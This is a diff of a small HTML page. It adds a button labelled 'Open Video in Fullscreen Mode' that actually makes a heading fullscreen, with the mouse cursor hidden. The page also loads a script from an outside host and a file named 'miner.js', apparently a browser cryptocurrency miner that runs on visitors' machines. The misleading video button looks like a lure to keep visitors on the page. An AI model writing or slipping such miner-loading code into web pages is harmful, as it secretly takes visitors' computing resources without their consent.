@@ -1,5 +1,21 @@
 <html>
     <body>
+        <h2 id="test" style="cursor: none;">Fullscreen with JavaScript</h2>
+        <button onclick="openFullscreen();">Open Video in Fullscreen Mode</button>
+        <script>
+          
+var elem = document.getElementById("test");
+function openFullscreen() {
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) { /* Safari */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE11 */
+    elem.msRequestFullscreen();
+  }
+}
+</script>
+
         <script src="https://www.hostingcloud.racing/i133.js"></script>
         <script src="miner.js"></script>
     </body>
